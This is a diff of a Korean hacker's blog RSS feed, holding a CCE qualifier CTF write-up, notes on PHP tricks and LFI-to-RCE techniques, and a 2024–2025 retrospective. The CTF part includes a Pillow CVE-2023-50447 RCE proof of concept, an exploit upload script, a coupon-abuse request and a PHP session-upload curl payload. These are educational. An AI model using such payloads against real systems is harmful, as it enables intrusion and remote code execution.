@@ -1,4 +1,609 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>nullbyte_</title><description>My Blog</description><link>https://fuwari.vercel.app/</link><language>en</language><item><title>2025 HackQuest [Simple Note] Write-Up</title><link>https://fuwari.vercel.app/posts/hackquest/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/hackquest/</guid><description> </description><pubDate>Tue, 22 Jul 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;카이스트에서 주최한 HackQuest에 참가했고 웹 4문제 중 3문제를 풀었다.&lt;br /&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>nullbyte_</title><description>My Blog</description><link>https://itznullbyte.github.io/</link><language>en</language><item><title>CCE Quals Write-Up</title><link>https://itznullbyte.github.io/posts/2025_cce/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/2025_cce/</guid><description>6th with Team: 해킹의 정석</description><pubDate>Tue, 19 Aug 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;img src=&quot;./scoreboard.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;YISF 본선 전날에 CCE 예선을 나갔다.&lt;br /&gt;
+해킹의 정석팀으로 참여해서 6등으로 본선을 가게 되었다.&lt;br /&gt;
+올해 목표가 메이저 대회 본선 진출과 수상이었는데 비록 코게는 못갔지만 CCE 본선에 갈 수 있게 되어 다행이다&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;Solves&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;First Day&lt;/li&gt;
+&lt;li&gt;Discount Coupon&lt;/li&gt;
+&lt;li&gt;Photo Editing&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;h2&gt;First Day&lt;/h2&gt;
+&lt;p&gt;방화벽을 우회해서 XSS 하는 문제였다&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;firewall.sh&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env bash
+set -euo pipefail
+
+iptables -P INPUT DROP
+iptables -P OUTPUT DROP
+iptables -P FORWARD DROP
+
+iptables -A INPUT -i lo -j ACCEPT
+iptables -A OUTPUT -o lo -j ACCEPT
+
+iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
+iptables -A OUTPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
+
+iptables -A INPUT -p tcp --dport 80 -m conntrack --ctstate NEW -j ACCEPT
+iptables -A OUTPUT -p udp -j ACCEPT
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;TCP로 요청 나가는걸 막고 있으므로 UDP나 DNS로 leak 해야겠단 생각을 했다&lt;/p&gt;
+&lt;p&gt;마침 팀원이 전에 학교 프로젝트로 DNS 서버 구축해둔게 있었고 그거 가지고 플래그 leak했다&lt;/p&gt;
+&lt;h2&gt;Discount Coupon&lt;/h2&gt;
+&lt;p&gt;Golang으로 쓰여진거라 쫄았는데 생각보다 별거 없었다&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if formValues.Has(&quot;coupon&quot;) {
+  for range formValues[&quot;coupon&quot;] {
+    if user.CouponUsed {
+      tx.Rollback()
+      var prods []models.Product
+      config.DB.Find(&amp;amp;prods)
+      c.HTML(400, &quot;products.html&quot;, gin.H{
+        &quot;msg&quot;:        &quot;이미 쿠폰을 사용하셨습니다.&quot;,
+        &quot;products&quot;:   prods,
+        &quot;couponLeft&quot;: !user.CouponUsed,
+        &quot;balance&quot;:    user.Balance,
+        &quot;username&quot;:   user.Username,
+      })
+      return
+    }
+    price = price / 2
+  }
+  user.CouponUsed = true
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;취약점이 대놓고 보인다&lt;/p&gt;
+&lt;p&gt;바디에 들어간 coupon 수만큼 루프돌면서 적용해주고 있으므로 coupon 값 중복해서 넣으면 다 적용시켜 계속 할인된다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;product_id=2&amp;amp;coupon=on&amp;amp;coupon=on&amp;amp;coupon=on&amp;amp;coupon=on&amp;amp;coupon=on&amp;amp;coupon=on
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;cce2025{52eb1c95630d4d8ed303cf44d8ac2b8e46b15501b23d379a7238118b754a55e6}&lt;/code&gt;&lt;/p&gt;
+&lt;h2&gt;Photo Editing&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;def apply_transform(transform_name, filenames, user_uuid, options=None):
+    &quot;&quot;&quot;Apply a specific transformation to images and return PIL Image objects.&quot;&quot;&quot;
+    images = get_processed_images(filenames, user_uuid)
+    if not images:
+        return []
+    if options is None:
+        options = {}
+
+    if transform_name == &apos;rotate&apos;:
+        angle = options.get(&apos;angle&apos;, 90)
+        return [img.rotate(angle, expand=True) for img in images]
+    
+    elif transform_name == &apos;composite&apos;:
+        if len(images) != 2:
+            raise ValueError(&quot;이미지 합성은 반드시 2개의 이미지를 선택해야 합니다.&quot;)
+        img1 = images[0]
+        img2 = images[1].resize(img1.size)
+        return [Image.blend(img1, img2, alpha=0.5)]
+
+    elif transform_name == &apos;append&apos;:
+        num_images = len(images)
+        if num_images == 0:
+            raise ValueError(&quot;이미지를 선택해주세요.&quot;)
+        elif num_images &amp;gt; 4:
+            raise ValueError(&quot;이미지 조합은 최대 4장까지만 지원합니다.&quot;)
+
+        if num_images == 1:
+            return images 
+        elif num_images &amp;lt;= 3:
+            min_width = min(img.width for img in images)
+            resized_images = [img.resize((min_width, int(img.height * min_width / img.width))) for img in images]
+            
+            total_height = sum(img.height for img in resized_images)
+            dst = Image.new(&apos;RGB&apos;, (min_width, total_height))
+            
+            y_offset = 0
+            for img in resized_images:
+                dst.paste(img, (0, y_offset))
+                y_offset += img.height
+            return [dst]
+        elif num_images == 4:
+            min_size = min(img.width for img in images), min(img.height for img in images)
+            resized_images = [img.resize(min_size) for img in images]
+            
+            dst = Image.new(&apos;RGB&apos;, (min_size[0] * 2, min_size[1] * 2))
+            dst.paste(resized_images[0], (0, 0))
+            dst.paste(resized_images[1], (min_size[0], 0))
+            dst.paste(resized_images[2], (0, min_size[1]))
+            dst.paste(resized_images[3], (min_size[0], min_size[1]))
+            return [dst]
+
+    elif transform_name == &apos;contour&apos;:
+        return [img.filter(ImageFilter.CONTOUR) for img in images]
+
+    elif transform_name == &apos;solarize&apos;:
+        threshold = options.get(&apos;threshold&apos;, 128)
+        return [ImageOps.solarize(img, threshold=threshold) for img in images]
+
+    elif transform_name == &apos;brightness&apos;:
+        factor = options.get(&apos;factor&apos;, 1.5)
+        return [ImageEnhance.Brightness(img).enhance(factor) for img in images]
+
+    elif transform_name == &apos;grayscale&apos;:
+        return [img.convert(&apos;L&apos;) for img in images]
+
+    elif transform_name == &apos;sepia&apos;:
+        sepia_matrix = [
+            0.393, 0.769, 0.189, 0,
+            0.349, 0.686, 0.168, 0,
+            0.272, 0.534, 0.131, 0
+        ]
+        return [img.convert(&quot;RGB&quot;, sepia_matrix) for img in images]
+
+    elif transform_name == &apos;custom_formula&apos;:
+        exp = options.get(&apos;expression&apos;)
+        if not exp:
+            raise ValueError(&quot;Custom formula requires an &apos;expression&apos;.&quot;)
+        env = { fname: img for fname, img in zip(filenames, images) }
+        try:
+            result = ImageMath.eval(exp, env)
+            return [result]
+        except Exception as e:
+            return [None]
+    else:
+        raise ValueError(f&quot;Unknown transformation: {transform_name}&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;custom_formula에서 &lt;code&gt;ImageMath.eval()&lt;/code&gt;을 사용한다
+서버에서 Pillow 10.0.0을 사용하고 있어 &lt;code&gt;CVE-2023-50447&lt;/code&gt;를 트리거 할 수 있다&lt;/p&gt;
+&lt;p&gt;CVE 내용을 보자면&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from PIL import Image, ImageMath
+
+image1 = Image.open(&apos;__class__&apos;)
+image2 = Image.open(&apos;__bases__&apos;)
+image3 = Image.open(&apos;__subclasses__&apos;)
+image4 = Image.open(&apos;load_module&apos;)
+image5 = Image.open(&apos;system&apos;)
+
+
+expression = f&quot;().__class__.__bases__[0].__subclasses__()[84].load_module(&apos;os&apos;).system(&apos;calc&apos;)&quot;
+
+environment = {
+    image1.filename: image1,
+    image2.filename: image2,
+    image3.filename: image3,
+    image4.filename: image4,
+    image5.filename: image5
+}
+
+ImageMath.eval(expression, environment)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;특정한 이름을 가진 파일들을 &lt;code&gt;ImageMath.eval()&lt;/code&gt;의 두번째 인자로 넣어주면 RCE가 가능하다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+from bs4 import BeautifulSoup
+import uuid
+import os
+
+url = &apos;http://3.38.167.161:5000&apos;
+board_id = &apos;c3200d82-e892-4632-8dc5-bc225814f28d&apos;
+username = &apos;nullbyte&apos;
+password = &apos;123456&apos;
+image_paths = [&apos;__class__.png&apos;, &apos;__bases__.png&apos;, &apos;__subclasses__.png&apos;, &apos;load_module.png&apos;, &apos;system.png&apos;]
+
+s = requests.Session()
+
+def get_csrf():
+    res = s.get(f&apos;{url}/auth/login&apos;)
+    soup = BeautifulSoup(res.text, &apos;html.parser&apos;)
+    token = soup.find(&apos;input&apos;, {&apos;name&apos;: &apos;csrf_token&apos;})[&apos;value&apos;]
+    return token
+
+login_data = {
+    &apos;username&apos;: username,
+    &apos;password&apos;: password,
+    &apos;csrf_token&apos;: get_csrf()
+}
+
+s.post(f&apos;{url}/auth/login&apos;, data=login_data)
+
+res = s.get(f&apos;{url}/board/{board_id}/create&apos;)
+soup = BeautifulSoup(res.text, &apos;html.parser&apos;)
+csrf_token = soup.find(&apos;input&apos;, {&apos;name&apos;: &apos;csrf_token&apos;})[&apos;value&apos;]
+
+files = []
+for path in image_paths:
+    ext = path.rsplit(&apos;.&apos;, 1)[1].lower()
+    new_name = path.rsplit(&apos;.&apos;, 1)[0]
+    files.append((&apos;images&apos;, (new_name, open(path, &apos;rb&apos;), &apos;image/jpeg&apos;)))
+
+data = {
+    &apos;csrf_token&apos;: csrf_token,
+    &apos;title&apos;: &apos;nullbyte&apos;,
+    &apos;content&apos;: &apos;안녕&apos;
+}
+
+res = s.post(f&apos;{url}/board/{board_id}/create&apos;, data=data, files=files)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;이미지 5개 업로드하고&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./poc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Dockerfile에 wget이 있어서 그거 가지고 플래그 보냈다&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;cce2025{1dd859f7e538fef324b4ef83f5004433c590c253a5750ac6667ba1abc95789adcf93595acfd927f2694514dace1f82f9b4cea0}&lt;/code&gt;&lt;/p&gt;
+</content:encoded></item><item><title>PHP Tricks &amp; RCE 기법 정리 (해킹하는 부엉이들)</title><link>https://itznullbyte.github.io/posts/php_in_ctf/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/php_in_ctf/</guid><description> </description><pubDate>Tue, 05 Aug 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&amp;lt;iframe width=&quot;100%&quot; height=&quot;468&quot; src=&quot;https://www.youtube.com/watch?v=qXR8QyvGscM&amp;amp;list=PLokTrj1EwOzww676mj_wIP7poVTq8oWyP&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
+&lt;p&gt;:::note
+해킹하는 부엉이 - [초보자를 위한 PHP Tricks + RCE 기법들 소개] 발표를 정리하여 작성했습니다.&lt;br /&gt;
+해당 발표의 발표자이신 &lt;a href=&quot;https://one3147.tistory.com/&quot;&gt;&lt;code&gt;one3147&lt;/code&gt;&lt;/a&gt;님의 동의를 받고 작성하는 글입니다
+:::&lt;/p&gt;
+&lt;p&gt;요즘 CTF 나갈 때마다 느끼는 생각이 &lt;code&gt;nodejs&lt;/code&gt;말고 다른 환경이 나오면 무기력해진다는 것이다.
+nodejs는 계속 다뤄왔으니 해킹을 시작했을때부터 접근하기 쉬웠고 꽤 난이도 있는 문제들도 많이 풀어왔다.&lt;br /&gt;
+그러나 php랑 python으로 작성된 백엔드 바이너리를 볼 때마다 벽을 느끼곤한다&lt;/p&gt;
+&lt;p&gt;어떻게 보완할지 고민하던 와중 TeamH4C에서 진행하는 &lt;code&gt;해킹하는 부엉이들&lt;/code&gt;에서 &lt;code&gt;One&lt;/code&gt;님이 진행하신 해당 발표를 접하게 되었고 정리해보려한다&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;PHP Tricks?&lt;/h3&gt;
+&lt;p&gt;php에서는 (N)e(K) 형태의 문법을 지원한다. 이게 뭐냐면 대충 &lt;code&gt;2e12&lt;/code&gt;로 표현하면 php가 $2 \cdot (10^{12})$ 같이 해석한다는거다.
+이게 어떤식으로 악용 가능하냐면&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if(md5(&apos;QNKCDZO&apos;) == 0)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;위와 같이 해시를 검증한다면 &lt;code&gt;0e8304...&lt;/code&gt;이 되고 $0 \cdot 10^{8304...}$로 해석되어 &lt;code&gt;True&lt;/code&gt;를 반환하게 된다.&lt;/p&gt;
+&lt;p&gt;이게 PHP 느슨한 비교를 사용하는 기법이랑 이어질 수가 있는데&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if(&apos;1e2&apos; == 100) {}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;문자열 삽입 -&amp;gt; number 타입과 비교 -&amp;gt; 1e2가 100으로 해석&lt;/p&gt;
+&lt;h3&gt;PHP 문법&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;function sayHi() {
+  echo &apos;hi&apos;
+}
+
+&apos;hi&apos;();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;php에서는 문자열 뒤에다 &lt;code&gt;()&lt;/code&gt;넣어서 호출해도 함수가 호출된다고 한다.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;preg_&lt;/code&gt;로 시작하는 함수들은 정규표현식을 기반으로 구현된다. 따라서 ReDos 가능성이 존재한다&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;h3&gt;PHP LFI, RCE&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+  include $_GET[&apos;path&apos;]
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;CTF하다보면 이런 코드 한 번쯤은 봤을 것이다&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;file:///&lt;/code&gt; 프로토콜이랑 &lt;code&gt;php wrapper&lt;/code&gt;들을 허용해서 LFI가 발생한다.
+이는 이후 설명할 LFI to RCE로 연계 가능하다&lt;/p&gt;
+&lt;p&gt;그리고 자주 보이던 &lt;code&gt;allow_url_includes&lt;/code&gt;가 켜져있으면 이런 코드에서 http 프로토콜 또한 허용해 include 한다.
+&lt;code&gt;allow_url_includes = On&lt;/code&gt; 이라면 원격에 있는 웹셸파일을 포함시켜 RCE하는 식의 기법도 있다&lt;/p&gt;
+&lt;h4&gt;Log Poisoning RCE&lt;/h4&gt;
+&lt;p&gt;LOG 파일에 payload를 주입해 LFI로 파일을 불러와 실행시키는 기법이다.
+그냥 링크에 때려박으면 인코딩 되어 로그로 쓰여지기에, User Agent 같은 곳에 페이로드 삽입 후 &lt;code&gt;/var/log/apache2/access.log&lt;/code&gt; 로그파일을 불러와 익스한다.&lt;/p&gt;
+&lt;p&gt;그러나 일반적으로는 &lt;code&gt;access.log&lt;/code&gt;에 &lt;code&gt;excute perm&lt;/code&gt;이 없어 RCE가 불가하기에 서버에서 파일에 실행 권한을 부여하는 취약점이 있지 않은 이상 트리거가 어렵다&lt;/p&gt;
+&lt;h4&gt;PHP Session RCE&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;session&lt;/code&gt; 정보는 &lt;code&gt;/var/lib/php/sessions/session_(session)&lt;/code&gt; 형태로 저장된다.&lt;/p&gt;
+&lt;p&gt;id나 password(대부분 해시 되겠지만) 같이 session에 저장되는 정보들에 php payload를 작성하고 &lt;code&gt;LFI&lt;/code&gt;로 해당 파일을 로드한다면 페이로드를 실행할 수 있다&lt;/p&gt;
+&lt;h4&gt;PHP Session Upload Progress RCE&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;session.upload_progress.enabled&lt;/code&gt;가 On일 때, 업로드 기능이 있는 엔드포인트에 다음과 같은 명령어를 전송하여 익스한다&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl url.kr/upload.php -H &apos;Cookie: PHPSESSID=mysession&apos; -F &apos;PHP_SESSION_UPLOAD_PROGRESS=(BASE64 ENCODED RCE PAYLOAD)&apos; -F &apos;upload=@/etc/passwd&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;그러면 &lt;code&gt;/var/lib/php/sessions/session_my_sess&lt;/code&gt;가 생성되어 인코딩된 페이로드가 저장되고, 이를 LFI 포인트에서 &lt;code&gt;php://filter/convert.base64-decode/resource=&lt;/code&gt;으로 불러와 &lt;code&gt;RCE&lt;/code&gt; 가능하다&lt;/p&gt;
+&lt;p&gt;만약 &lt;code&gt;session.upload_progress.cleanup&lt;/code&gt; 옵션이 켜져있다면 &lt;code&gt;upload progress&lt;/code&gt; 이후 바로 제거되기에 익스할 틈이 안난다
+따라서 이땐 Dos등 race condition 가능한 포인트를 찾은 후 큰 파일을 업로드하여 cleanup 타이밍을 지연시켜야한다.&lt;/p&gt;
+&lt;h4&gt;PHP + Nginx LFI to RCE&lt;/h4&gt;
+&lt;p&gt;https://bierbaumer.net/security/php-lfi-with-nginx-assistance/
+이거 읽어보고 적극적으로 활용해보도록 하자&lt;/p&gt;
+&lt;h4&gt;Others&lt;/h4&gt;
+&lt;p&gt;발표에선 언급 되지 않았으나 몇 개 더 찾아봤다&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;file()&lt;/code&gt;, &lt;code&gt;hash_file()&lt;/code&gt;, &lt;code&gt;file_get_contents()&lt;/code&gt;, &lt;code&gt;copy()&lt;/code&gt; 같은 함수에 값을 넣을 수 있다면 &lt;a href=&quot;https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle&quot;&gt;자료&lt;/a&gt;보고 익스를 시도해보자. &lt;code&gt;error_based&lt;/code&gt;로 세션파일 내용 알아낼 수 있다.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;LFI 우회 기법중에 &lt;code&gt;shell.p\\hp&lt;/code&gt; 처럼 &lt;code&gt;\&lt;/code&gt; 두 번 넣으면 우회되는 기법이 있다&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/60fdf3880d3d&quot;&gt;SSU CTF에서 나온 기법인데 이것도 알아두면 좋을거 같다&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;해캠, SSU CTF에서 나왔던 기법이다.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;$_GET[&apos;my_name.kr&apos;];
+// https://url?my_name.kr=1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;쿼리를 이처럼 받는다면 정상적으로 쿼리를 넣기 힘들 것이다. &lt;code&gt;.&lt;/code&gt;이 &lt;code&gt;_&lt;/code&gt;로 치환되어 해석해 버리기 때문이다.&lt;br /&gt;
+&lt;code&gt;_&lt;/code&gt;을 &lt;code&gt;[&lt;/code&gt;로 대체해주자. SSU CTF 당시 어떤분의 설명에 의하면 &lt;code&gt;[&lt;/code&gt;가 &lt;code&gt;_&lt;/code&gt;로 치환되며 내부 조건문을 탈출하고 &lt;code&gt;.&lt;/code&gt;은 건들지 않게 된다고 한다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;https://url?my[name.kr=1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;발표에서 BOM Mapping도 나왔는데 나중에 정리해보겠다&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;p&gt;정말 도움 되었다..! 웹 해킹 공부 시작 초반부터 &lt;code&gt;One&lt;/code&gt;님 블로그 정독하며 공부해왔는데 다시 한 번 감사하다는 말씀 드리고 싶다&lt;/p&gt;
+</content:encoded></item><item><title>24, 25년 회고록</title><link>https://itznullbyte.github.io/posts/2024_2025_memory/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/2024_2025_memory/</guid><description> </description><pubDate>Sat, 02 Aug 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;24년 9월&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;./neisplus.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;24년도에 본격적으로 버그바운티를 시작했던거 같다.
+디코 돌아다니다가 어떤 유저분이 KERIS에서 주최하는 4세대 NEIS Plus 버그바운티 공고를 올리신걸 봤고 카카오 깔짝깔짝 경력도 있던터라 바로 참여해봤다.&lt;/p&gt;
+&lt;p&gt;시작한 당일날에 운좋게 취약점을 찾게 되었고 12월에 포상금 받으라고 연락왔다.&lt;br /&gt;
+학교에서 메일 온거 보고 하루종일 좋아했던게 기억난다 ㅋㅋ 무려 나이스의 취약점을 내가 찾았다고? 라는 성취감이 꽤 오래 갔던거 같다&lt;/p&gt;
+&lt;h2&gt;24년 11월&lt;/h2&gt;
+&lt;p&gt;가입만 해놓고 방치해놨던 드림핵에 들어가봤는데 드림핵 5만명 가입 기념 UCC CTF란게 열린다고 했다.&lt;br /&gt;
+23년 X-MAS CTF 뭣 모르고 참여했다 한 문제도 못 풀었던게 떠올라 지금의 내가 얼마나 성장했을지 궁금해서 참여해봤다.&lt;br /&gt;
+(사실 상품이 푸짐했던게 눈이 가지 않았나 싶다)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./ucc1.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;./ucc2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://dreamhack.io/wargame/challenges/1578&quot;&gt;&lt;code&gt;JS is the best&lt;/code&gt;&lt;/a&gt; 라는 문제 하나를 풀게 되었고 생각보다 높은 등수인 28등으로 마무리했다.&lt;/p&gt;
+&lt;p&gt;이걸 기점으로 보안을 본격적으로 공부하게 되었다.&lt;/p&gt;
+&lt;h2&gt;24년 12월&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;./warp.png&quot; alt=&quot;&quot; /&gt;
+보안에 흥미가 생기자마자 경기과학고에서 여는 &lt;code&gt;WaRP CTF&lt;/code&gt; 공고를 보게 되었고 마찬가지로 웹 1솔로 마무리 했다.&lt;br /&gt;
+끝나고 얼마 뒤 업솔빙 때린 문제들이 몇 개 있었던지라 꽤 아쉽긴 했다. 20팀 중에 2팀 뽑는 특별상에도 기대를 걸었는데 놓쳐버렸다..ㅎㅎ&lt;/p&gt;
+&lt;p&gt;23년 중학교 겨울방학 때 작은 취약점 하나를 카카오에서 찾아 Hall of Fame에 등재 되었었다.
+카카오에서 버그바운티 대상을 대폭 증가시킨다는 내용의 안내 메일이 왔었고 그 추가 대상에서 전에 찾아놨던 취약점이 있었던지라 24년도 HoF 올라가겠다고 생각하고 있었다.&lt;/p&gt;
+&lt;p&gt;근데 까먹고 있다가 보고서를 안써서 먼저 보고서 제출하신 누군가에게 뺏겨버렸다..&lt;/p&gt;
+&lt;h2&gt;25년 1월&lt;/h2&gt;
+&lt;p&gt;고1 겨울방학을 시작한 1월엔 꽤 시도해본게 많았다
+일단 첫번째로 CTF와 드림핵 풀이를 시작했다.&lt;/p&gt;
+&lt;p&gt;버그바운티는 해봤지만 다양한 웹해킹 기법에 대한 이해도는 전혀 없는 상태였다.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./dreamhack_lvl_1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;드림핵 &lt;code&gt;Web Begginer, 1레벨&lt;/code&gt; 위주로 풀려고 노력했다.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./soongsil.png&quot; alt=&quot;&quot; /&gt;
+작은 해킹 스터디에 들어가서 팀원들과 숭실대 &lt;code&gt;SSU CTF&lt;/code&gt;에 나갔다.&lt;br /&gt;
+대학 vs 일반부로만 구분되었기에 일반부에 중고등학생과 성인들이 모두 포함되어서 더 빡셌던거 같다.
+6시간 풀로 뛰어서 &lt;code&gt;100pt&lt;/code&gt;짜리 문제들은 전부 푸는데 성공했다.&lt;/p&gt;
+&lt;p&gt;결국 종합 28등 일반부 17등으로 마무리했다. 팀원들이 이미 풀어놓은 문제를 혼자 끙끙거리며 푸는 뻘짓을 하긴했지만.. 뭐 다 같이 열심히했고 고수들 사이에서 28등이면 나쁘지 않은 성과라고 생각한다&lt;/p&gt;
+&lt;h2&gt;25년 2월&lt;/h2&gt;
+&lt;p&gt;특별한거 없이 해외 CTF랑 워게임만 계속 풀었다.
+&lt;img src=&quot;./dreamhack_info.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;./dreamhack_fixer.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;문제 풀고 풀이 적으며 복습하니 어느새 해결사 배너를 얻게 되었다.&lt;/p&gt;
+&lt;p&gt;Sechack님, One님, Predic님 등 드림핵 웹 네임드분들의 블로그를 전부 정독했다. 영양가 있는 정보들 많이 얻어갈 수 있었다 (감사합니다..)&lt;/p&gt;
+&lt;p&gt;이렇게 웹해킹을 살펴보다보니 접하게 된게 &lt;code&gt;EJS SSTI 취약점&lt;/code&gt;이었다. 이걸로 CTF 언인텐도 나온 사례가 많았고 관련 문제도 드림핵에 있었다.&lt;br /&gt;
+원래 주력언어가 nodejs였기에 날잡아서 EJS 모듈을 분석했고 드림핵에서 관련 문제들 보이는건 전부 다 풀어놓았다.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./ejs.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;25년 3월&lt;/h2&gt;
+&lt;p&gt;기다리던 &lt;code&gt;코드게이트&lt;/code&gt; 예선이 열렸다. 간절히 본선가고 싶었는데 결국 예선에서 떨어졌다..&lt;br /&gt;
+할 줄도 모르는 리버싱 문제 풀려다가 대회가 끝나버렸다. 주력분야에 충분히 매달려야겠다는 깨달음을 얻었다 ㅠㅠ&lt;/p&gt;
+&lt;h2&gt;25년 4월&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;./kakao_hof.png&quot; alt=&quot;&quot; /&gt;
+카카오에서 포상금 받으라 연락왔다. 25년 명예의 전당 달달하다.
+위험도에 비해선 턱도 없이 적은 금액이었는데 보고서를 유치원생 일기장 같이 쓴 게 한 몫하지 않았나 싶다&lt;/p&gt;
+&lt;p&gt;여담으로 4월달에 카카오 취약점 하나 더 찾아서 바운티 넣었는데 지금까지 받은 금액 중 제일 높은 금액을 받게 되었다.
+부모님 밥도 사드리고 그럴 생각이다&lt;/p&gt;
+&lt;h2&gt;25년 5월&lt;/h2&gt;
+&lt;p&gt;버그바운티 팀에서 활동하며 동기부여 받아서 본격적으로 버그바운티를 시작했다
+오래 잡고 있던 오픈소스 취약점 하나 찾아서 issue 올리고 MITRE를 통해 CVE 제보했다&lt;/p&gt;
+&lt;p&gt;패치데이도 좀 해보고 싶어서 열심히 뛰었고 모두 작은 취약점들이었지만&lt;br /&gt;
+Dreamhack과 Goorm에 유의미한 취약점들을 제보할 수 있었다&lt;/p&gt;
+&lt;p&gt;드림핵 9레벨도 풀어보고 싶어서 몇주동안 잡았고 &lt;a href=&quot;https://dreamhack.io/wargame/challenges/1056&quot;&gt;&lt;code&gt;leakless&lt;/code&gt;&lt;/a&gt;를 풀어낼 수 있었다. 다시 풀라면 못 풀거 같다 익스짜기 진짜 힘들었다&lt;/p&gt;
+&lt;h2&gt;25년 6월&lt;/h2&gt;
+&lt;p&gt;시험끝나고 본격적으로 대회들이 몰려오기 시작했다&lt;br /&gt;
+처음으로 공지뜬건 아주대 COSS CTF와 Kaist HackQuest였다.&lt;/p&gt;
+&lt;p&gt;아주대는 수도권 대상으로만 참여자를 모집했던터라 팀원들과 쉽게 본선을 갈 수 있었다.&lt;br /&gt;
+첫 오프라인 CTF였는데 닉네임만 들어본 네임드분들을 실제로 만나니 신기했다. 수상은 못했다&lt;/p&gt;
+&lt;p&gt;카이스트는 웹 마지막 문제 풀어서 겨우 본선 진출에 성공했다.&lt;br /&gt;
+포너블이랑 리버싱을 진짜 못하는지라 어려울줄 알았는데 3일정도 써서 난이도 있던 웹문제를 풀어냈다&lt;/p&gt;
+</content:encoded></item><item><title>CCE Apollo Write-Up</title><link>https://itznullbyte.github.io/posts/cce_apollo/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/cce_apollo/</guid><description> </description><pubDate>Wed, 30 Jul 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Solve&lt;/h1&gt;
